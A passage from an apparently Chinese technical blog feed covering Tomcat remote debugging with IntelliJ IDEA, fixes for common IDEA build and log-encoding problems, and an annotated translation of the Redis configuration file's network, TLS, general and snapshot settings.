<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">JAVA_OPTS</span><span class="token operator">=</span><span class="token string">'-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>方式二：</p>
<p>修改<code>catalina.sh</code>  的 <code>JPDA_ADDRESS</code></p>
<p>修改前：</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221216141033811-1684719109569-5.png" alt="image-20221216141033811"></p>
<p>修改后：</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221216141158238-1684719109569-1.png" alt="image-20221216141158238"></p>
</li>
</ul>
<h2 id="本地IDEA配置">本地IDEA配置</h2>
<p>IDEA 版本号：2022.3</p>
<ul>
<li>
<p>方式一：Remote JVM Debug</p>
<ol>
<li>
<p>工具栏：Run-&gt; Edit Configurations , 添加 <code>Remote JVM Debug</code></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221216141658513-1684719109569-3.png" alt="image-20221216141658513"></p>
</li>
<li>
<p>配置远程服务器IP和DEBUG端口，以及选择本地项目</p>
<img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221216142129704-1684719109569-7.png" alt="image-20221216142129704" style="zoom: 80%;"> 
</li>
<li>
<p>本地DEBUG启动,启动成功之后，控制台会输出相应链接成功日志</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221216142244190-1671172511331-28-1684719109569-9.png" alt="image-20221216142244190"></p>
</li>
</ol>
</li>
<li>
<p>方式二：Tomcat Remote 模式</p>
<ol>
<li>
<p>添加Tomcat Server 配置</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221216142501412-1684719109569-11.png" alt="image-20221216142501412"></p>
</li>
<li>
<p>配置远程服务器IP和应用端口</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221216142946755-1684719109569-15.png" alt="image-20221216142946755" style="zoom:80%;"> c.</p>
</li>
<li>
<p>配置远程服务器DEBUG端口</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221216143100989-1684719109569-17.png" alt="image-20221216143100989"></p>
</li>
<li>
<p>debug 启动</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221216143344220-1684719109569-13.png" alt="image-20221216143344220"></p>
<p>服务器监听：</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221216143412864-1684719109569-19.png" alt="image-20221216143412864"></p>
</li>
</ol>
</li>
</ul>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEA 使用问题记录</title>
    <url>/20221026/764e2995.html</url>
    <content><![CDATA[<p>[Toc]</p>
<h1>找不到包或者找不到符号</h1>
<blockquote>
<p>类文件存在的前提下，报错：找不到包或者找不到符号</p>
</blockquote>
<h2 id="利用Maven-Reimport">利用Maven-Reimport</h2>
<p><img src="D:%5CNotespace%5CHexo%5Chmxyl%5Csource_images%5Cimage-20211125093632598-1667118386299-59-1678443310910-183-1684721362098-63.png" alt="image-20211125093632598"></p>
<h2 id="Invalidate-and-Restart">Invalidate and Restart</h2>
<p><img src="D:%5CNotespace%5CHexo%5Chmxyl%5Csource_images%5Cimage-20211125093653072-1667118386300-60-1678443310909-175-1684721362098-65.png" alt="image-20211125093653072"></p>
<h2 id="重新编译">重新编译</h2>
<h3 id="点开Project-Structure-找到项目编译输出目录">点开Project Structure 找到项目编译输出目录</h3>
<h3 id="将target目录下文件清空">将target目录下文件清空</h3>
<h3 id="右键项目重新build">右键项目重新build</h3>
<p><img src="D:%5CNotespace%5CHexo%5Chmxyl%5Csource_images%5Cimage-20211125093733929-1667118386300-61-1678443310910-181-1684721362098-59.png" alt="image-20211125093733929"></p>
<p><img src="D:%5CNotespace%5CHexo%5Chmxyl%5Csource_images%5Cimage-20211125093748957-1667118386300-62-1678443310909-177-1684721362098-61.png" alt="image-20211125093748957"></p>
<h2 id="利用Maven-Install">利用Maven-Install</h2>
<p><img src="D:%5CNotespace%5CHexo%5Chmxyl%5Csource_images%5Cimage-20211125093759368-1667118386300-63-1678443310909-179-1684721362098-67.png" alt="image-20211125093759368"></p>
<h1>IDEA配置tomcat日志乱码</h1>
<ol>
<li>
<p>第一步（tomcat7/8）tomcat：<br>
找到tomcat文件夹下的conf文件夹，去修改里面的logging.properties文件两种修改方式（第一种方法不行再用第二种）：</p>
<ul>
<li>将文件中的5个UTF-8修改为GBK</li>
</ul>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125093935522-1667118386300-64-1678443072138-164.png" alt="image-20211125093935522"></p>
<ul>
<li>将文件中的有关UTF-8的行用’#'注释掉</li>
</ul>
<p><img src="D:%5CNotespace%5CHexo%5Chmxyl%5Csource_images%5Cimage-20211125094101237-1667118386301-65-1678443072139-168-1684721279471-51.png" alt="image-20211125094101237"></p>
</li>
<li>
<p>第二步（IDEA2019）<br>
进入文件后添加一段代码：-Dfile.encoding=UTF-8</p>
<p><img src="D:%5CNotespace%5CHexo%5Chmxyl%5Csource_images%5Cimage-20211125094120088-1667118386301-66-1678443072138-160-1684721279471-47.png" alt="image-20211125094120088"></p>
</li>
<li>
<p>第三步</p>
<p><img src="D:%5CNotespace%5CHexo%5Chmxyl%5Csource_images%5Cimage-20211125094148869-1667118386301-67-1678443072138-162-1684721279471-49.png" alt="image-20211125094148869"></p>
<p><img src="D:%5CNotespace%5CHexo%5Chmxyl%5Csource_images%5Cimage-20211125094213607-1667118386301-68-1678443072139-166-1684721279471-53.png" alt="image-20211125094213607"></p>
</li>
<li>
<p>第四步重启IDEA</p>
</li>
</ol>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis-配置文件</title>
    <url>/20230208/6b8605c4.html</url>
    <content><![CDATA[<h1>官方模板文件</h1>
<p>参考：<a href="https://redis.io/docs/management/config-file/">https://redis.io/docs/management/config-file/</a></p>
<p>各版本参数变更：<a href="https://docs.aws.amazon.com/zh_cn/AmazonElastiCache/latest/red-ug/ParameterGroups.Redis.html">https://docs.aws.amazon.com/zh_cn/AmazonElastiCache/latest/red-ug/ParameterGroups.Redis.html</a></p>
<h1>具体配置项</h1>
<h2 id="INCLUDES：引入自定义配置文件">INCLUDES：引入自定义配置文件</h2>
<p>如果你有一个适用于所有Redis服务器的标准模板，但也需要自定义一些每个服务器的设置，可以使用 <code>include </code> 配置</p>
<p>选项<code>include</code>不会被命令<code>CONFIG REWRITE</code>从管理或Redis哨兵重写。由于Redis总是使用最后处理的行作为配置指令的值，你最好把<code>include</code>放在配置文件的开头，以避免在运行时覆盖配置更改。</p>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment">################################## INCLUDES ###################################</span>
<span class="token comment"># include /path/to/local.conf</span>
<span class="token comment"># include /path/to/other.conf</span>
<span class="token comment"># include /path/to/fragments/*.conf</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="MODULES">MODULES</h2>
<p>在启动时加载模块。如果服务器不能加载模块，它将中止。可以使用多个<code>loadmodule</code>指令。</p>
<p>通过Redis Module可以扩展Redis本身的能力，能够实现一些Redis本身不支持的命令</p>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment">################################## MODULES #####################################</span>
<span class="token comment"># loadmodule /path/to/my_module.so</span>
<span class="token comment"># loadmodule /path/to/other_module.so</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="NETWORK：网络配置">NETWORK：网络配置</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">################################## NETWORK #####################################</span>
<span class="token comment"># 默认情况下，如果没有指定bind配置指令，Redis将监听来自主机上所有可用网络接口的连接。</span>
<span class="token comment"># 可以使用bind配置指令监听一个或多个选定的接口，后面跟着一个或多个IP地址。</span>
<span class="token comment"># 不可用仅指不对应于任何网络接口的地址。已经在使用的地址将总是失败，不支持的协议将无法访问。</span>
<span class="token comment"># Examples:</span>
<span class="token comment">#</span>
<span class="token comment"># bind 192.168.1.100 10.0.0.1     # listens on two specific IPv4 addresses</span>
<span class="token comment"># bind 127.0.0.1 ::1              # listens on loopback IPv4 and IPv6</span>
<span class="token comment"># bind * -::*                     # like the default, all available interfaces</span>
<span class="token comment">#</span>
<span class="token comment"># ~~~ WARNING ~~~ </span>
<span class="token comment"># 如果运行Redis的计算机直接暴露在互联网上，绑定到所有接口是危险的，并将实例暴露给互联网上的每个人。</span>
<span class="token comment"># 所以默认情况下，我们取消注释下面的bind指令，这将迫使Redis只监听IPv4和IPv6(如果可用)环回接口地址(这意味着Redis将只能接受来自其运行的同一主机的客户端连接)。</span>
<span class="token comment">#</span>
<span class="token comment"># 如果您确定希望您的实例侦听所有接口,注释掉下面一行。</span>
<span class="token comment"># 您还需要设置密码，除非您显式禁用protected模式。</span>
<span class="token comment"># ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
<span class="token builtin class-name">bind</span> <span class="token number">127.0</span>.0.1 -::1

<span class="token comment"># 默认情况下，传出连接(从副本到主，从哨兵到实例，集群总线等)不会绑定到特定的本地地址。</span>
<span class="token comment"># 在大多数情况下，这意味着操作系统将基于路由进行处理和连接通过的接口。</span>
<span class="token comment">#</span>
<span class="token comment"># 使用bind-source-addr可以配置要绑定的特定地址,这也可能影响连接的路由方式。举例:</span>
<span class="token comment"># bind-source-addr 10.0.0.1</span>

<span class="token comment"># 保护模式是一层安全保护层, 默认启用。</span>
<span class="token comment"># 为了避免打开的Redis实例在互联网上被访问和利用。当开启保护模式且默认用户没有密码时，服务器会自动关闭。</span>
protected-mode <span class="token function">yes</span>

<span class="token comment"># Redis使用默认的加固安全配置指令来减少攻击无辜用户。因此，几种敏感配置指令是不可变的，一些潜在危险的命令会被阻塞。</span>
<span class="token comment"># 控制Redis写入文件的配置指令(例如，'dir' 和'dbfilename')，并且通常不会在运行时修改。通过使它们不可变来保护它们。</span>

<span class="token comment"># 通过设置，这些可以暴露给所有连接，也可以只暴露给本地连接</span>
<span class="token comment"># 下面列出的每一个配置到这些值中的任意一个:</span>
<span class="token comment">#</span>
<span class="token comment"># no    - 阻塞任何连接(保持不可变)</span>
<span class="token comment"># yes   - 允许任何连接(无保护)</span>
<span class="token comment"># local - 只允许本地连接. Ones originating from the IPv4 address (127.0.0.1), IPv6 address (::1) or Unix domain sockets.</span>
<span class="token comment">#</span>
<span class="token comment"># enable-protected-configs no</span>
<span class="token comment"># enable-debug-command no</span>
<span class="token comment"># enable-module-command no</span>

<span class="token comment"># 接受指定端口上的连接，默认为6379 (IANA #815344).</span>
<span class="token comment"># IANA: https://www.iana.org 互联网地址编码分配机构</span>
<span class="token comment"># 如果指定了端口0,Redis将不会监听TCP套接字。</span>
port <span class="token number">6379</span>

<span class="token comment"># TCP listen() backlog.</span>
<span class="token comment">#</span>
<span class="token comment"># 在每秒请求数高的环境中，您需要大量的积压，以避免客户端连接速度慢的问题。</span>
<span class="token comment"># 请注意，Linux内核会将其静默地截断为/proc/sys/net/core/somaxconn的值（cat /proc/sys/net/core/somaxconn）</span>
<span class="token comment"># 因此请确保同时提高somaxconn和tcp_max_syn_backlog（cat /etc/sysctl.conf）的值，以便获得所需的效果。</span>
tcp-backlog <span class="token number">511</span>

<span class="token comment"># Unix socket.</span>
<span class="token comment"># 指定用于侦听传入连接的Unix套接字的路径。没有默认值，所以如果没有指定，Redis将不会监听unix套接字。</span>
<span class="token comment">#</span>
<span class="token comment"># unixsocket /run/redis.sock</span>
<span class="token comment"># unixsocketperm 700</span>

<span class="token comment"># 在客户端空闲N秒后关闭连接(0为禁用)</span>
<span class="token function">timeout</span> <span class="token number">0</span>

<span class="token comment"># TCP keepalive.</span>
<span class="token comment">#</span>
<span class="token comment"># 如果非零，在没有通信的情况下使用SO_KEEPALIVE向客户端发送TCP ACKs。这很有用，有两个原因:</span>
<span class="token comment"># 1) 检测失效节点</span>
<span class="token comment"># 2) 强制中间的网络设备认为连接是活的。</span>
<span class="token comment">#</span>
<span class="token comment"># 在Linux操作系统中，该值(单位为秒)为发送ACK的周期。注意，关闭连接需要两倍的时间。在其他内核上，周期取决于内核配置。</span>
<span class="token comment"># 这个选项的合理值是300秒。从Redis 3.2.1开始，是新的Redis默认值</span>
tcp-keepalive <span class="token number">300</span>

<span class="token comment"># 应用操作系统特有的机制，用指定的ID标记监听套接字，以支持高级路由和过滤功能。</span>
<span class="token comment">#</span>
<span class="token comment"># 在Linux上，ID表示一个连接标记</span>
<span class="token comment"># 在FreeBSD上，ID表示套接字cookie ID。</span>
<span class="token comment"># 在OpenBSD上，ID表示路由表ID。</span>

<span class="token comment"># 默认值是0，这意味着不需要标记。</span>
<span class="token comment"># socket-mark-id 0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="TLS-SSL">TLS/SSL</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">################################# TLS/SSL #####################################</span>
<span class="token comment"># 默认情况下，TLS/SSL协议处于禁用状态。要启用它，可以使用“tls-port”配置指令定义tls侦听端口。port指定了0，则不再监听TCP套接字。</span>
<span class="token comment"># 在默认端口上启用TLS，请使用:</span>
<span class="token comment"># port 0</span>
<span class="token comment"># tls-port 6379</span>

<span class="token comment"># 配置X.509证书和私钥，用于对连接的客户端、主节点或集群对等体进行服务器身份验证。这些文件应该是PEM格式的。</span>
<span class="token comment"># tls-cert-file redis.crt</span>
<span class="token comment"># tls-key-file redis.key</span>
<span class="token comment"># 如果KEY文件是使用密码短语加密的，那么它也可以包含在这里。</span>
<span class="token comment"># tls-key-file-pass secret</span>

<span class="token comment"># 通常Redis对服务器功能(接受连接)和客户端功能(从主服务器复制，建立集群总线连接等)使用相同的证书。</span>
<span class="token comment"># 有时颁发证书时带有将其指定为仅客户端证书或仅服务器证书的属性。在这种情况下，可能需要对传入(服务器)和传出(客户端)连接使用不同的证书。要做到这一点，请使用以下指令:</span>
<span class="token comment"># tls-client-cert-file client.crt</span>
<span class="token comment"># tls-client-key-file client.key</span>
<span class="token comment"># 如果KEY文件是使用密码短语加密的，那么它也可以包含在这里。</span>
<span class="token comment"># tls-client-key-file-pass secret</span>

<span class="token comment"># 配置DH参数文件，开启 DH (Diffie-Hellman) KEY交换功能，这是旧版本OpenSSL(&lt;3.0)的要求。新版本不需要这种配置，建议不要这样做。</span>
<span class="token comment"># tls-dh-params-file redis.dh</span>

<span class="token comment"># 配置CA证书包或目录以验证TLS/SSL客户端和对等体。Redis需要至少其中一个的显式配置，并且不会隐式地使用系统范围的配置。</span>
<span class="token comment"># tls-ca-cert-file ca.crt</span>
<span class="token comment"># tls-ca-cert-dir /etc/ssl/certs</span>

<span class="token comment"># 默认情况下，TLS端口上的客户端(包括副本服务器)需要使用有效的客户端证书进行身份验证。</span>
<span class="token comment"># - no：则不需要且不接受客户端证书。</span>
<span class="token comment"># - optional：则接受客户端证书，并且在提供时必须有效，但不是必需的。</span>
<span class="token comment"># tls-auth-clients no</span>
<span class="token comment"># tls-auth-clients optional</span>

<span class="token comment"># 默认情况下，Redis副本不会尝试与其主服务器建立TLS连接。使用下面的指令在复制链路上启用TLS。</span>
<span class="token comment"># tls-replication yes</span>

<span class="token comment"># 默认情况下，Redis集群总线使用普通TCP连接. 要为总线协议启用TLS，请使用以下指令:</span>
<span class="token comment"># tls-cluster yes</span>

<span class="token comment"># 默认情况下，只启用TLSv1.2和TLSv1.3，强烈建议禁用旧的正式弃用版本，以减少攻击面。</span>
<span class="token comment"># 您可以显式地指定要支持的TLS版本。允许的值不区分大小写，包括 “TLSv1”，“TLSv1.1”，“TLSv1.2”，"TLSv1.3" (OpenSSL &gt;= 1.1.1) 或者任意组合.</span>
<span class="token comment"># 如果只启用TLSv1.2和TLSv1.3，请使用:</span>
<span class="token comment"># tls-protocols "TLSv1.2 TLSv1.3"</span>

<span class="token comment"># 配置允许的密码。有关此字符串语法的更多信息，请参阅 cipher (1ssl) 手册（ 此配置仅适用于&lt;= TLSv1.2）</span>
<span class="token comment"># tls-ciphers DEFAULT:!MEDIUM</span>

<span class="token comment"># 配置允许使用的TLSv1.3密码套件。有关此字符串语法的更多信息，特别是关于TLSv1.3密码套件的信息，请参阅 cipher (1ssl) 手册</span>
<span class="token comment"># tls-ciphersuites TLS_CHACHA20_POLY1305_SHA256</span>

<span class="token comment">#在选择密码时，使用服务器的首选项而不是客户端首选项。默认情况下，服务器遵循客户端的首选项。</span>
<span class="token comment"># tls-prefer-server-ciphers yes</span>

<span class="token comment"># 默认情况下，启用TLS会话缓存，以允许支持TLS会话缓存的客户端更快、更便宜地重新连接。使用下面的指令禁用缓存。</span>
<span class="token comment"># tls-session-caching no</span>

<span class="token comment"># 修改TLS缓存的默认会话数。零值将缓存设置为无限大小。默认大小为20480。</span>
<span class="token comment"># tls-session-cache-size 5000</span>

<span class="token comment"># 修改TLS缓存会话的默认超时时间。缺省超时时间为300秒。</span>
<span class="token comment"># tls-session-cache-timeout 60</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="GENERAL：通用设置">GENERAL：通用设置</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">################################# GENERAL #####################################</span>
<span class="token comment"># 默认情况下，Redis不作为守护进程运行。如果需要，配置为 “yes”</span>
<span class="token comment"># Note that Redis will write a pid file in /var/run/redis.pid when daemonized.</span>
<span class="token comment"># 注意，Redis会在文件 /var/run/redis.pid 中写入守护时的 pid</span>
<span class="token comment"># 当Redis被upstart或systemd监控时，该参数无影响。</span>
daemonize no


<span class="token comment"># 如果你从upstart或systemd运行Redis, Redis可以与你的supervision tree交互。这些监督方法只是表明“流程已经准备好了”。他们不允许连续的ping回你的supervisor。</span>
<span class="token comment"># 选项:</span>
<span class="token comment">#   - no      - no supervision interaction</span>
<span class="token comment">#   - upstart - signal upstart by putting Redis into SIGSTOP mode requires "expect stop" in your upstart job config</span>
<span class="token comment">#   - systemd - signal systemd by writing READY=1 to $NOTIFY_SOCKET on startup, and updating Redis status on a regular basis.</span>
<span class="token comment">#   - auto    - detect upstart or systemd method based on UPSTART_JOB or NOTIFY_SOCKET environment variables</span>
<span class="token comment">#</span>
<span class="token comment"># 默认为 “no”。要在 upstart/systemd下运行，你可以简单地取消下面这行代码的注释:</span>
<span class="token comment"># supervised auto</span>

<span class="token comment"># 如果指定了pid文件，Redis在启动时将其写入指定的位置，并在退出时删除它。</span>
<span class="token comment">#</span>
<span class="token comment"># 如果在配置中没有指定pid文件，那么当服务器运行时，不会创建pid文件。</span>
<span class="token comment"># 当服务器被守护时，即使没有指定pid文件，也会使用pid文件，默认为 "/var/run/redis.pid"。</span>
<span class="token comment">#</span>
<span class="token comment"># 正常创建一个pid文件是最好的结果:如果Redis不能创建它，没有什么不好的事情发生，服务器将正常启动和运行。</span>
<span class="token comment"># 注意，在现代Linux系统中，"/run/redis.pid" 更符合要求，应该用它来代替。</span>
pidfile /var/run/redis_6379.pid

<span class="token comment"># 指定服务器日志级别</span>
<span class="token comment"># - debug：有很多信息，对开发/测试很有用</span>
<span class="token comment"># - verbose：许多极少用到的信息，但不像调试级别那样混乱</span>
<span class="token comment"># - notice：合理冗余, 但可能是在生产中需要的</span>
<span class="token comment"># - warning：只记录非常重要/关键的消息</span>
loglevel notice

<span class="token comment"># 指定日志文件名。</span>
<span class="token comment"># 空字符串也可以用来强制Redis登录到标准输出。</span>
<span class="token comment"># 注意，如果使用标准输出进行日志记录，但是使用daemonize，那么日志将被发送到/dev/null</span>
logfile <span class="token string">""</span>

<span class="token comment"># 要启用系统日志记录器，只需将'syslog-enabled'设置为yes，并可选地更新其他系统日志参数以满足您的需要</span>
<span class="token comment"># syslog-enabled no</span>

<span class="token comment"># 指定系统日志标识。</span>
<span class="token comment"># syslog-ident redis</span>

<span class="token comment"># 系统日志记录的级别，必须为USER或LOCAL0-LOCAL7之间。</span>
<span class="token comment"># syslog-facility local0</span>

<span class="token comment"># 要禁用内建的崩溃日志（它可能会在需要时产生更干净的core dumps），取消注释如下:</span>
<span class="token comment"># crash-log-enabled no</span>

<span class="token comment"># 要禁用作为崩溃日志一部分的运行时快速内存检查（这可能会让redis更快地终止），取消以下注释:</span>
<span class="token comment"># crash-memcheck-enabled no</span>

<span class="token comment">#设置数据库数量。默认数据库是 DB 0，您可以使用select &lt;dbid&gt;在每个连接的基础上选择一个不同的数据库，其中dbid是从0开始计数</span>
databases <span class="token number">16</span>


<span class="token comment"># 默认情况下，Redis只在开始记录到标准输出，并且标准输出是TTY, 系统日志记录被禁用，时显示ASCII艺术徽标</span>
<span class="token comment"># 基本上，这意味着徽标通常只在交互会话中显示。</span>
<span class="token comment"># 然而，通过将以下选项设置为yes，可以强制4.0之前的行为，并始终在启动日志中显示ASCII艺术徽标。</span>
always-show-logo no

<span class="token comment"># 默认情况下，Redis修改进程标题(如'top'和'ps'所示)以提供一些运行时信息。</span>
<span class="token comment"># 通过将以下设置为no，可以禁用此功能并保留进程名为已执行。</span>
set-proc-title <span class="token function">yes</span>

<span class="token comment"># 当更改流程标题时，Redis使用以下模板来构造修改后的标题。模板变量用花括号指定。支持如下变量:</span>
<span class="token comment">#</span>
<span class="token comment"># {title}           父进程时执行的进程名，或子进程的类型</span>
<span class="token comment"># {listen-addr}     绑定地址或 "*"，后面跟着TCP或TLS端口监听，或Unix套接字(如果有的话)</span>
<span class="token comment"># {server-mode}     特殊模式, 例如. "[sentinel]" or "[cluster]"</span>
<span class="token comment"># {port}            TCP监听端口，或0</span>
<span class="token comment"># {tls-port}        TLS监听端口, or 0.</span>
<span class="token comment"># {unixsocket}      Unix套接字监听端口, or "".</span>
<span class="token comment"># {config-file}     使用的配置文件名称.</span>
<span class="token comment">#</span>
proc-title-template <span class="token string">"{title} {listen-addr} {server-mode}"</span>

<span class="token comment"># 设置用于字符串比较操作的本地环境，也会影响Lua脚本的性能。空字符串表示区域设置是由环境变量派生的。</span>
<span class="token comment"># Set the local environment which is used for string comparison operations, and  also affect the performance of Lua scripts. </span>
locale-collate <span class="token string">""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="SNAPSHOTTING：快照">SNAPSHOTTING：快照</h2>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230209170518390.png" alt="image-20230209170518390"></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">################################ SNAPSHOTTING  ################################</span>

<span class="token comment"># 将DB数据保存到磁盘</span>
<span class="token comment"># save &lt;seconds&gt; &lt;changes&gt; [&lt;seconds&gt; &lt;changes&gt; ...]</span>
<span class="token comment">#</span>
<span class="token comment"># 经过给定秒数（seconds），且对DB的写操作超过了给定数量（changes），Redis将保存DB。</span>
<span class="token comment"># 快照可以通过一个空字符串参数完全禁用，如下例所示:</span>
<span class="token comment">#</span>
<span class="token comment"># save ""</span>
<span class="token comment">#</span>
<span class="token comment"># 默认情况下Redis会保存DB</span>
<span class="token comment">#   - 3600 1： 在3600秒(一小时)之后，至少执行了一次更改</span>
<span class="token comment">#   - 300 100： 在300秒(五分钟)之后，至少执行了100次更改</span>
<span class="token comment">#   - 60 10000： 在60秒(一分钟)之后，至少执行了10000次更改</span>
<span class="token comment"># 您可以通过取消注释下面的行显式地设置这些参数</span>
<span class="token comment"># save 3600 1 300 100 60 10000</span>

<span class="token comment"># 默认情况下，如果RDB快照启用(至少一个保存点) 并且最近的后台保存失败，Redis将停止接受写入。</span>
<span class="token comment"># 这将使用户意识到(以一种艰难的方式)数据没有正确地持久化在磁盘上，否则很可能没有人会注意到，从而发生一些灾难。</span>
<span class="token comment"># 如果后台保存进程重新开始工作，Redis将自动允许再次写入。</span>
<span class="token comment">#</span>
<span class="token comment"># 但是，如果你已经设置了适当的Redis服务器监控和持久化，你可能想要禁用这个功能，这样即使有磁盘、权限等问题，Redis也会继续正常工作。</span>
stop-writes-on-bgsave-error <span class="token function">yes</span>

<span class="token comment"># 默认启用：当保存快照文件（RDB数据库）时，使用LZF压缩字符串对象。</span>
<span class="token comment"># 如果你想在save child中节省一些CPU，将其设置为 "no"，但如果你有可压缩的值或键，数据集可能会更大。</span>
rdbcompression <span class="token function">yes</span>

<span class="token comment"># 从RDB版本5开始，CRC64校验和被放在文件的末尾。</span>
<span class="token comment"># 这使得格式更能抵抗损坏，但在保存和加载RDB文件时，会有性能损失(大约10%)，因此您可以禁用它以获得最大性能。</span>
<span class="token comment"># 创建的RDB文件时，禁用校验或者校验和为零，将告诉加载代码跳过该检查</span>
rdbchecksum <span class="token function">yes</span>


<span class="token comment"># loading an RDB or RESTORE payload 时，允许或禁止对 ziplist 或者 listpack 等进行 full sanitization checks</span>
<span class="token comment"># 这降低了稍后在处理命令时发生断言或崩溃的可能性。</span>
<span class="token comment"># Options:</span>
<span class="token comment">#   no         - 从不执行 full sanitization</span>
<span class="token comment">#   yes        - 总是执行 full sanitization</span>
<span class="token comment">#   clients    - 仅对用户连接执行full sanitization.</span>
<span class="token comment">#                排除: RDB 文件, 从主连接接收到的RESTORE命令, 和具有skip-cleanup-payload ACL标志的客户端连接.</span>
<span class="token comment"># 默认值应该是'clients'，但由于它目前会影响通过MIGRATE进行集群重分片，因此默认情况下暂时设置为'no'。</span>
<span class="token comment">#</span>
<span class="token comment"># sanitize-dump-payload no</span>

<span class="token comment"># 配置快照文件名</span>
dbfilename dump.rdb

<span class="token comment"># 在未启用持久性的情况下，删除实例中复制使用的RDB文件</span>
<span class="token comment"># 默认情况下，该选项是禁用的，但是在某些环境下，出于法规或其他安全考虑，应该尽快删除由master保存在磁盘上以提供副本，或由副本存储在磁盘上以加载它们以进行初始同步的RDB文件。</span>
<span class="token comment"># 注意，此选项仅在同时禁用了AOF和RDB持久性的实例中有效，否则将完全忽略。</span>
<span class="token comment">#</span>
<span class="token comment"># 获得相同效果的另一种(有时更好)方法是在主实例和副本实例上使用无磁盘复制。但是，在副本实例的环境下，无磁盘并不总是一种选择。</span>
rdb-del-sync-files no

<span class="token comment"># 快照工作目录</span>
<span class="token comment"># dbfilename配置的快照文件，将被写入这个目录中</span>
<span class="token comment"># Append Only产生的文件也将在此目录中创建。</span>
<span class="token comment">#</span>
<span class="token comment"># 注意，这里必须指定目录，而不是文件名。</span>
<span class="token function">dir</span> ./<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="REPLICATION：主从复制">REPLICATION：主从复制</h2>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment">################################# REPLICATION #################################</span>

<span class="token comment"># Master-Replica 复制. 使用replicaof使一个Redis实例成为另一个Redis服务器的副本。 </span>
<span class="token comment"># 关于Redis复制需要尽快了解的一些事情</span>
<span class="token comment">#</span>
<span class="token comment">#   +------------------+      +---------------+</span>
<span class="token comment">#   |      Master      | ---&gt; |    Replica    |</span>
